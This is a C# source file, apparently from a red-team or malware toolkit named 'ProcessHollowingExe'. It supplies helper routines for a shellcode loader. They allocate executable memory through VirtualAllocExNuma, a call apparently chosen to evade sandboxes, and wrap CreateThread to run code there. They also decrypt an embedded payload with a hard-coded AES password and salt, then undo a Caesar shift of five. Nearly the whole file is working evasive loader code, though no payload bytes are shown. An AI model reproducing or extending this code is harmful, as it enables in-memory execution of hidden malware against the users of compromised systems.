using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace ProcessHollowingExe
{
    public class PFuncs
    {

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        public static void MemCopy(byte[] buf, Int32 start, IntPtr addr, int size)
        {
            Marshal.Copy(buf, start, addr, size);
        }

        public static IntPtr CThread(IntPtr attr, UInt32 stacksize, IntPtr addr, IntPtr lpParam, UInt32 flags, IntPtr threadId)
        {
            return CreateThread(attr, stacksize, addr, lpParam, flags, threadId);
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        private static UInt32 getUint32(string val)
        {
            byte[] data = Convert.FromBase64String(val);
            string decodedString = Encoding.UTF8.GetString(data);
            return Convert.ToUInt32(decodedString);
        }

        public static IntPtr VAllocate()
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x40, 0);
            if (mem == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to allocate Memory.");
                return IntPtr.Zero;
            }

            Console.WriteLine($"[+] Memory Allocation Successful: {mem}");
            return mem;
        }

        private static byte[] AesDecrypt(byte[] input)
        {
            try
            {
                var pdb =
                    new PasswordDeriveBytes("ic34xe!!!",
                        new byte[] { 0x67, 0x65, 0x74, 0x66, 0x75, 0x63, 0x6b, 0x65, 0x64 });
                var ms = new MemoryStream();
                Aes aes = new AesManaged();
                aes.KeySize = 256;
                aes.Key = pdb.GetBytes(aes.KeySize / 8);
                aes.IV = pdb.GetBytes(aes.BlockSize / 8);
                var cs = new CryptoStream(ms,
                    aes.CreateDecryptor(), CryptoStreamMode.Write);
                cs.Write(input, 0, input.Length);
                cs.Close();
                Console.WriteLine("[+] Successfully Decrypted AES Payload.");
                return ms.ToArray();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] FAILED Decrypting AES Payload!: {e.Message}");
                throw;
            }
        }

        public static byte[] CaesarDecrypt(byte[] buffer)
        {
            Console.WriteLine($"[+] Decrypting AES Payload.");
            var decrypted = AesDecrypt(buffer);

            Console.WriteLine($"[+] Decoding Caesar Encoded Payload.");
            var decoded = new byte[decrypted.Length];

            for (var i = 0; i < decrypted.Length; i++)
            {
                decoded[i] = (byte)(((uint)decrypted[i] - 5) & 0xFF);
            }

            Console.WriteLine($"[+] Successfully Decoded Caesar Payload.");
            return decoded;
        }
    }
}